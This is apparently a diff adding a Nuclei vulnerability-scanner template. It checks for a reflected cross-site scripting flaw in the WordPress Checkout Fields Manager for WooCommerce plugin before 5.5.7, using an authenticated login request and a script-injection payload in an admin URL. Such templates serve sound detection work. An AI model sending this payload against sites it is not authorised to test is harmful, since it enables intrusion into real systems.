@@ -1,0 +1,52 @@
+id: checkout-fields-manager-xss
+
+info:
+  name: WordPress Checkout Fields Manager for WooCommerce <5.5.7 - Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: WordPress Checkout Fields Manager for WooCommerce 5.5.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
+  reference:
+    - https://wpscan.com/vulnerability/ea617acd-348a-4060-a8bf-08ab3b569577
+    - https://wordpress.org/plugins/woocommerce-checkout-manager
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 2
+  tags: xss,wp,wordpress,authenticated,woocommerce,wpscan,wp-plugin
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '>--><script>alert(1)</script>&action=wooccm_nuke_options&'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a004630440220489ac33efedb02a0e4789801c2df8d37a9890aa2ceb888359a8a22e805cee2ea02207e98b68d41de9b23c6c9852bf5c9670e3f4c418c3eb5ac75b8fd4632617aa561:922c64590222798bb761d5b6d8e72950
